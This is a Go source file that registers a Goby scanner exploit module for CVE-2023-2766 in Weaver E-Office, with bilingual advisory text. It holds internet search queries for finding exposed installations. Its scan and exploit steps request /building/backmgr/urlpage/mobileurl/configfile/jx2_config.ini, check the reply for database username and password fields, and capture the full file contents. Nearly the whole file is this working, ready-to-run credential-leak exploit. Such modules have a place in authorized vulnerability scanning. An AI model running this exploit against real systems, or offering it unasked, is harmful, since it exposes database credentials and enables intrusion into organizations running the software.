package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Description": "<p>A vulnerability has been discovered in Weaver OA 9.5 and is classified as problematic. This vulnerability may affect some unknown handlers under the file path /building/backmgr/urlpage/mobileurl/configfile/jx2_config. This issue could result in a file or directory becoming accessible and could be exploited by a remote launch attack.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-05-17",
    "Author": "rongzheng",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "2",
    "Impact": "<p>This vulnerability may allow an attacker to remotely execute code, gain system control, and access sensitive files, posing a serious security threat.</p>",
    "Recommendation": "<p>Currently, the manufacturer has released an upgrade patch to fix the vulnerability.</p><p><a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "References": [
        "https://github.com/8079048q/cve/blob/main/weaveroa.md",
        "https://nvd.nist.gov/vuln/detail/CVE-2023-2766",
        "https://vuldb.com/?ctiid.229271",
        "https://vuldb.com/?id.229271"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/plain",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "sdbuser =",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "sdbpassword =",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|{{{fixedhostinfo}}}",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2023-2766"
    ],
    "CNNVD": [
        "CNNVD-202305-1694"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Translation": {
        "CN": {
            "Name": "WeaverE-Office /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini 信息泄漏漏洞（CVE-2023-2766）",
            "Product": "泛微-EOffice",
            "Description": "<p>在 Weaver OA 9.5 中发现了一个漏洞，被归类为有问题的。该漏洞可能会影响文件路径 /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini 下的某些未知处理程序。这个问题可能导致可访问文件或目录，并且可能会被远程启动的攻击利用。<br></p>",
            "Recommendation": "<p><span style=\"font-size: 15px;\">目前厂商已发布升级补丁以修复漏洞</span></p><p><span style=\"font-size: 15px;\"><a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></span></p>",
            "Impact": "<p>该漏洞可能导致攻击者远程执行代码，获取系统控制权并访问敏感文件，造成严重的安全威胁。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "WeaverE-Office /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini information leakage vulnerability (CVE-2023-2766)",
            "Product": "Weaver-EOffice",
            "Description": "<p>A vulnerability has been discovered in Weaver OA 9.5 and is classified as problematic. This vulnerability may affect some unknown handlers under the file path /building/backmgr/urlpage/mobileurl/configfile/jx2_config. This issue could result in a file or directory becoming accessible and could be exploited by a remote launch attack.<br></p>",
            "Recommendation": "<p>Currently, the manufacturer has released an upgrade patch to fix the vulnerability.</p><p><a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
            "Impact": "<p>This vulnerability may allow an attacker to remotely execute code, gain system control, and access sensitive files, posing a serious security threat.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "Name": "WeaverE-Office /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini information leakage vulnerability (CVE-2023-2766)",
    "PostTime": "2024-03-14",
    "PocId": "10934"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}